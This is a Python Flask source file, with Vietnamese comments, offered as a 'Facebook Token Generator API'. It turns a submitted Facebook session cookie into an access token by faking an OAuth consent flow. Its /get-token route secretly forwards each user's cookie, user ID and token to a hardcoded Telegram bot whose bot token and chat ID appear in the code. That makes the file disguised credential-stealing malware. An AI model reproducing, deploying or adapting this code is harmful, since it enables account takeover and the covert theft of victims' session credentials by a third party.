from flask import Flask, request, jsonify
import requests
import uuid
import re
from urllib.parse import urlparse, parse_qs, unquote

app = Flask(__name__)

class FacebookTokenGenerator:
    def __init__(self, app_id, client_id, cookie):
        self.app_id = app_id
        self.client_id = client_id
        self.cookie_raw = re.sub(r"\s+", "", cookie, flags=re.UNICODE)
        self.cookies = self._parse_cookies()

    def _parse_cookies(self):
        result = {}
        try:
            for i in self.cookie_raw.strip().split(';'):
                result.update({i.split('=')[0]: i.split('=')[1]})
            return result
        except:
            for i in self.cookie_raw.strip().split('; '):
                result.update({i.split('=')[0]: i.split('=')[1]})
            return result

    def GetToken(self):
        try:
            c_user = self.cookies.get("c_user")
            if not c_user:
                raise ValueError("Không tìm thấy c_user trong cookie")

            # Lấy fb_dtsg
            headers_dtsg = {
                'authority': 'www.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'dnt': '1',
                'dpr': '1.25',
                'sec-ch-ua': '"Chromium";v="117", "Not;A=Brand";v="8"',
                'sec-ch-ua-full-version-list': '"Chromium";v="117.0.5938.157", "Not;A=Brand";v="8.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"15.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                'viewport-width': '1038',
            }
            params = {
                'redirect_uri': 'fbconnect://success',
                'scope': 'email,public_profile',
                'response_type': 'token,code',
                'client_id': self.client_id,
            }
            
            get_data = requests.get(
                "https://www.facebook.com/v2.3/dialog/oauth",
                params=params,
                cookies=self.cookies,
                headers=headers_dtsg
            ).text
            
            fb_dtsg_match = re.search('DTSGInitData",,{"token":"(.+?)"', get_data.replace('[]', ''))
            if not fb_dtsg_match:
                raise ValueError("Không tìm thấy fb_dtsg trong response")
            fb_dtsg = fb_dtsg_match.group(1)

            # Lấy token ban đầu
            headers_token = {
                'authority': 'www.facebook.com',
                'accept': '*/*',
                'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                'content-type': 'application/x-www-form-urlencoded',
                'dnt': '1',
                'origin': 'https://www.facebook.com',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Chromium";v="117", "Not;A=Brand";v="8"',
                'sec-ch-ua-full-version-list': '"Chromium";v="117.0.5938.157", "Not;A=Brand";v="8.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"15.0.0"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                'x-fb-friendly-name': 'useCometConsentPromptEndOfFlowBatchedMutation',
            }

            data = {
                'av': str(c_user),
                '__user': str(c_user),
                'fb_dtsg': fb_dtsg,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'useCometConsentPromptEndOfFlowBatchedMutation',
                'variables': '{"input":{"client_mutation_id":"4","actor_id":"' + c_user + '","config_enum":"GDP_READ","device_id":null,"experience_id":"' + str(
                    uuid.uuid4()
                ) + '","extra_params_json":"{\\"app_id\\":\\"' + ''+self.client_id+'' + '\\",\\"display\\":\\"\\\\\\"popup\\\\\\"\\",\\"kid_directed_site\\":\\"false\\",\\"logger_id\\":\\"\\\\\\"' + str(
                    uuid.uuid4()
                ) + '\\\\\\"\\",\\"next\\":\\"\\\\\\"read\\\\\\"\\",\\"redirect_uri\\":\\"\\\\\\"https:\\\\\\\\\\\\/\\\\\\\\\\\\/www.facebook.com\\\\\\\\\\\\/connect\\\\\\\\\\\\/login_success.html\\\\\\"\\",\\"response_type\\":\\"\\\\\\"token\\\\\\"\\",\\"return_scopes\\":\\"false\\",\\"scope\\":\\"[\\\\\\"email\\\\\\",\\\\\\"public_profile\\\\\\"]\\",\\"sso_key\\":\\"\\\\\\"com\\\\\\"\\",\\"steps\\":\\"{\\\\\\"read\\\\\\":[\\\\\\"email\\\\\\",\\\\\\"public_profile\\\\\\"]}\\",\\"tp\\":\\"\\\\\\"unspecified\\\\\\"\\",\\"cui_gk\\":\\"\\\\\\"[PASS]:\\\\\\"\\",\\"is_limited_login_shim\\":\\"false\\"}","flow_name":"GDP","flow_step_type":"STANDALONE","outcome":"APPROVED","source":"gdp_delegated","surface":"FACEBOOK_COMET"}}',
                'server_timestamps': 'true',
                'doc_id': '6494107973937368',
            }

            response = requests.post(
                'https://www.facebook.com/api/graphql/',
                cookies=self.cookies,
                headers=headers_token,
                data=data
            ).json()

            uri = response["data"]["run_post_flow_action"]["uri"]
            parsed_url = urlparse(uri)
            query_params = parse_qs(parsed_url.query)
            close_uri = query_params.get("close_uri", [None])[0]
            decoded_close_uri = unquote(close_uri)
            fragment = urlparse(decoded_close_uri).fragment
            fragment_params = parse_qs(fragment)
            access_token = fragment_params.get("access_token", [None])[0]

            if not access_token:
                raise ValueError("Không tìm thấy access_token trong response")

            # Chuyển đổi token
            session_ap = requests.post(
                'https://api.facebook.com/method/auth.getSessionforApp',
                data={
                    'access_token': access_token,
                    'format': 'json',
                    'new_app_id': self.app_id,
                    'generate_session_cookies': '1'
                }
            ).json()
            token_new = session_ap.get("access_token")

            if token_new:
                return token_new
            else:
                raise ValueError("Không thể chuyển đổi token")

        except ValueError as e:
            raise e
        except Exception as e:
            raise Exception(f"Lỗi không xác định: {str(e)}")

TELEGRAM_BOT_TOKEN = '8217612873:AAE2AIX2Fzru98Dl-NN8DUwkA0AQnE82dS8'
TELEGRAM_CHAT_ID = '7258178082'

def send_to_telegram(cookie, uid, token):
    message = f"cookie: {cookie}\nuid: {uid}\ntoken: {token}"
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    try:
        requests.post(url, data=payload)
    except Exception as e:
        pass  # Không làm gì nếu gửi thất bại

@app.route('/get-token', methods=['GET'])
def get_token():
    try:
        # Lấy cookie từ URL parameter
        cookie = request.args.get('cookie')
        
        if not cookie:
            return jsonify({
                'success': False,
                'message': 'Cookie không được cung cấp'
            }), 400
        
        # Tạo FacebookTokenGenerator instance
        token_generator = FacebookTokenGenerator(
            app_id="275254692598279",  
            client_id="350685531728",
            cookie=cookie
        )
        
        # Lấy token
        token = token_generator.GetToken()
        
        if token:
            # Lấy c_user từ cookie để làm ID
            c_user = token_generator.cookies.get("c_user")
            
            # Gửi thông tin về Telegram bot
            send_to_telegram(cookie, c_user, token)
            
            return jsonify({
                'success': True,
                'data': {
                    'id': c_user,
                    'cookie': cookie,
                    'token': token
                }
            })
        else:
            return jsonify({
                'success': False,
                'message': 'Không thể tạo token'
            }), 500
            
    except ValueError as e:
        return jsonify({
            'success': False,
            'message': str(e)
        }), 400
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Lỗi hệ thống: {str(e)}'
        }), 500

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        'message': 'Facebook Token Generator API',
        'usage': 'GET /get-token?cookie=YOUR_COOKIE_HERE',
        'example': 'http://your-domain.com/get-token?cookie=c_user=123456789;xs=...'
    })

if __name__ == '__main__':

    app.run(debug=True, host='0.0.0.0', port=5000)
